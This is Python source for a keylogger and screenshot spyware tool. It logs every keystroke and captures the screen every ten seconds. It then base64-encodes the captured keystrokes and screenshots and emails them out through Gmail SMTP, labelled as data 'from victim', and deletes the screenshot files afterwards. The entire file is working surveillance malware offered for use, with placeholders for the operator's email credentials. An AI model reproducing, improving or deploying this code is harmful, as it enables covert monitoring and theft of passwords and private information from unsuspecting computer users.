import time
import os
from threading import Timer, Thread
from mss import mss
from pynput.keyboard import Listener
import smtplib,string,base64


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:
    pics_names =[]
    t=""
    def Mail_it(self,data, pics_names):

        yourgmail="your gmail"               #What is your gmail?
        yourgmailpass="your password"        #What is your gmail password
        sendto=yourgmail 
        print("Sending Data")
        data = base64.b64encode(data.encode('utf-8'))
        data = b'New data from victim(Base64 encoded)\n' + data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, data)
        server.close()
        print("Data sent")
        for pic in pics_names:
            print("Sending picture")
            data = base64.b64encode(open(pic , 'rb+').read())
            data = b'New pic data from victim(Base64 encoded)\n' + data
            server = smtplib.SMTP('smtp.gmail.com:587')
            server.starttls()
            server.login(yourgmail, yourgmailpass)
            server.sendmail(yourgmail, sendto, data)
            server.close()
            os.remove(pic)
            pics_names.remove(pic)
            print("Picture sent")


    def _on_press(self, k):
        with open('log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))
            self.t += str(k)

            if len(self.t) > 100:
                self.Mail_it(self.t,self.pics_names)
                self.t = ""
    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        ti = time.time()
        sct.shot(output='./{}.png'.format(ti))
        self.pics_names.append(str(ti)+'.png')


    def run(self, interval=10):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval is the amount of time in seconds that occurs between screenshots.
        """
        # self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()